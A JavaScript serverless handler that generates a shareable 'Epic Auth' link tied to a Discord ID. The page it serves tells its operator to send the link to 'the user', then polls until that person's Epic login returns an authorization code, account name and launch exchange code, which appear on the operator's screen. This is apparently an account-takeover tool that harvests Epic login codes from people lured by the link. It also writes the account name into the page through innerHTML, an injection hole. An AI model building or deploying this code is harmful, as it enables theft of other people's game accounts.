/**
 * GET /generate?discord_id=XXX
 *
 * Person A: creates a session in Supabase, shows the waiting page.
 * The waiting page polls /status?t=TOKEN every 2 seconds.
 * When status = 'done', shows the code. No SSE, no long connections.
 */

import crypto from 'crypto';
import { createSession } from './_db.js';

export default async function handler(req, res) {
  const discordId = String(req.query.discord_id || 'unknown').trim();
  const token     = crypto.randomBytes(16).toString('hex'); // 32-char, unique
  const base      = `https://${req.headers.host}`;
  const linkForB  = `${base}/go/${token}`;
  const pollUrl   = `${base}/status?t=${token}`;

  const ok = await createSession(token, discordId);
  if (!ok) {
    res.status(500).send('Failed to create session — check SUPABASE env vars');
    return;
  }

  console.log(`[GENERATE] discord_id=${discordId} token=${token.slice(0,8)} link=${linkForB}`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Epic Auth — Waiting</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #080808; color: #d0d0d0; font-family: -apple-system,'Segoe UI',system-ui,sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
    .card { background: #101010; border: 1px solid #1e1e1e; border-radius: 20px; padding: 44px 40px; max-width: 520px; width: 100%; }
    .badge { display: inline-flex; align-items: center; gap: 6px; background: #0e2a0e; border: 1px solid #1a4a1a; color: #00e676; font-size: 0.75em; font-weight: 600; padding: 4px 10px; border-radius: 20px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: .04em; }
    .dot { width: 7px; height: 7px; background: #00e676; border-radius: 50%; animation: pulse 1.4s ease-in-out infinite; }
    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
    h1 { font-size: 1.45em; color: #fff; font-weight: 700; margin-bottom: 8px; }
    .sub { color: #555; font-size: 0.88em; line-height: 1.6; margin-bottom: 32px; }
    .link-label { font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
    .link-row { display: flex; gap: 8px; background: #151515; border: 1px solid #252525; border-radius: 10px; padding: 12px 14px; margin-bottom: 28px; align-items: center; }
    .link-text { flex: 1; font-family: monospace; font-size: 0.82em; color: #00b4ff; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .copy-btn { background: #1e1e1e; border: 1px solid #2e2e2e; border-radius: 7px; color: #aaa; font-size: 0.78em; padding: 5px 12px; cursor: pointer; flex-shrink: 0; transition: all .15s; }
    .copy-btn:hover, .copy-btn.copied { border-color: #00e676; color: #00e676; }
    .status-row { display: flex; align-items: center; gap: 10px; padding: 13px 16px; border-radius: 10px; background: #0d0d0d; border: 1px solid #1a3a1a; font-size: 0.88em; margin-bottom: 20px; }
    .status-row.done { border-color: #00e676; background: #071a07; }
    .status-row.error { border-color: #3a1a1a; background: #1a0707; }
    .spinner { width: 16px; height: 16px; border: 2px solid #222; border-top-color: #00e676; border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status-text { color: #00e676; }
    .status-row.error .status-text { color: #ff5252; }
    .result-area { display: none; }
    .result-area.show { display: block; }
    .result-label { font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
    .code-box { background: #071a07; border: 1px solid #00e676; border-radius: 10px; padding: 16px; font-family: monospace; font-size: 1.05em; color: #00e676; letter-spacing: .05em; word-break: break-all; margin-bottom: 10px; cursor: pointer; }
    .code-box:hover { opacity: .85; }
    .account-name { font-size: 0.85em; color: #555; margin-bottom: 20px; }
    .account-name span { color: #aaa; }
    .launch-row { background: #0d1a0d; border: 1px solid #1a3a1a; border-radius: 10px; padding: 14px; margin-bottom: 20px; }
    .launch-label { font-size: 0.72em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
    .launch-code { font-family: monospace; font-size: 0.88em; color: #888; word-break: break-all; cursor: pointer; }
    .launch-code:hover { color: #ccc; }
    .steps { margin-top: 24px; border-top: 1px solid #161616; padding-top: 20px; }
    .step { display: flex; gap: 12px; margin-bottom: 10px; align-items: flex-start; }
    .step-num { width: 22px; height: 22px; border-radius: 50%; background: #1a1a1a; color: #555; font-size: 0.75em; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .step-num.done { background: #0e2a0e; color: #00e676; }
    .step-txt { font-size: 0.83em; color: #444; line-height: 1.5; }
    .step-txt.active { color: #888; }
    .step-txt.done { color: #555; text-decoration: line-through; }
    .token-hint { font-size: 0.72em; color: #2a2a2a; margin-top: 20px; text-align: center; }
    .new-btn { display: none; width: 100%; background: #151515; border: 1px solid #252525; border-radius: 10px; color: #555; padding: 12px; font-size: 0.85em; cursor: pointer; margin-top: 8px; transition: all .15s; }
    .new-btn:hover { border-color: #555; color: #ccc; }
    .new-btn.show { display: block; }
  </style>
</head>
<body>
<div class="card">
  <div class="badge"><div class="dot" id="badgeDot"></div><span id="badgeText">Live Session</span></div>
  <h1>Waiting for Epic Auth</h1>
  <p class="sub">Send the link below to the user. When they click it and log in, the auth code appears here automatically.</p>

  <div class="link-label">Send this to the user</div>
  <div class="link-row">
    <span class="link-text" id="linkText">${linkForB}</span>
    <button class="copy-btn" id="copyBtn" onclick="copyLink()">Copy</button>
  </div>

  <div class="status-row" id="statusRow">
    <div class="spinner" id="spinner"></div>
    <span class="status-text" id="statusText">Waiting for user to click the link…</span>
  </div>

  <div class="result-area" id="resultArea">
    <div class="result-label">Authorization Code <span style="color:#333;font-size:.85em">(click to copy)</span></div>
    <div class="code-box" id="codeBox" onclick="copyCode()"></div>
    <div class="account-name" id="accountName"></div>
    <div class="launch-row" id="launchRow" style="display:none">
      <div class="launch-label">Launch Exchange Code <span style="color:#333;font-size:.85em">(click to copy)</span></div>
      <div class="launch-code" id="launchCode" onclick="copyLaunch()"></div>
    </div>
  </div>

  <button class="new-btn" id="newBtn" onclick="window.location.href='/'">Generate New Link</button>

  <div class="steps">
    <div class="step"><div class="step-num done">✓</div><div class="step-txt done">Link generated</div></div>
    <div class="step"><div class="step-num" id="s2n">2</div><div class="step-txt active" id="s2t">User clicks the link (any PC, any network)</div></div>
    <div class="step"><div class="step-num" id="s3n">3</div><div class="step-txt" id="s3t">Epic confirms → code arrives here</div></div>
  </div>
  <div class="token-hint">Token: ${token.slice(0,8)}… · expires 10 min</div>
</div>

<script>
const POLL_URL = '${pollUrl}';
const LINK     = '${linkForB}';
let done = false;
let tick = 0;

function step(n, state) {
  const num = document.getElementById('s'+n+'n');
  const txt = document.getElementById('s'+n+'t');
  if (!num) return;
  if (state === 'done')   { num.className='step-num done'; num.textContent='✓'; txt.className='step-txt done'; }
  if (state === 'active') { num.style.background='#0e2a0e'; num.style.color='#00e676'; txt.className='step-txt active'; }
}

function setStatus(text, state='pending') {
  const row = document.getElementById('statusRow');
  const sp  = document.getElementById('spinner');
  document.getElementById('statusText').textContent = text;
  row.className = 'status-row' + (state==='done'?' done': state==='error'?' error':'');
  sp.style.display = (state === 'done' || state === 'error') ? 'none' : 'block';
}

async function poll() {
  if (done) return;
  tick++;
  try {
    const r = await fetch(POLL_URL);
    if (!r.ok) { setTimeout(poll, 2000); return; }
    const d = await r.json();

    if (d.status === 'clicked') {
      setStatus('User opened the link — waiting for Epic…');
      step(2, 'done'); step(3, 'active');
    } else if (d.status === 'done') {
      done = true;
      setStatus('✅ Auth code received!', 'done');
      step(2, 'done'); step(3, 'done');
      document.getElementById('badgeDot').style.animation = 'none';
      document.getElementById('badgeDot').style.background = '#00e676';
      document.getElementById('badgeText').textContent = 'Complete';
      document.getElementById('statusRow').style.display = 'none';

      const res = d.result || {};
      document.getElementById('codeBox').textContent = d.code || res.authCode || '';
      if (res.displayName) document.getElementById('accountName').innerHTML = 'Epic: <span>' + res.displayName + '</span>';
      if (res.launchCode) {
        document.getElementById('launchCode').textContent = res.launchCode;
        document.getElementById('launchRow').style.display = 'block';
      }
      document.getElementById('resultArea').className = 'result-area show';
      document.getElementById('newBtn').className = 'new-btn show';
      return;
    } else if (d.status === 'error') {
      setStatus('Error: ' + (d.result?.error || 'unknown'), 'error');
      document.getElementById('newBtn').className = 'new-btn show';
      return;
    }

    // Keep polling
    setTimeout(poll, 2000);
  } catch (e) {
    setTimeout(poll, 3000);
  }
}

function copyLink() {
  navigator.clipboard.writeText(LINK).then(() => {
    const b = document.getElementById('copyBtn');
    b.textContent = 'Copied!'; b.className = 'copy-btn copied';
    setTimeout(() => { b.textContent='Copy'; b.className='copy-btn'; }, 2000);
  });
}
function copyCode() {
  const t = document.getElementById('codeBox').textContent;
  navigator.clipboard.writeText(t).then(() => alert('Code copied!'));
}
function copyLaunch() {
  const t = document.getElementById('launchCode').textContent;
  navigator.clipboard.writeText(t).then(() => alert('Launch code copied!'));
}

// Start polling immediately
poll();
</script>
</body>
</html>`);
}
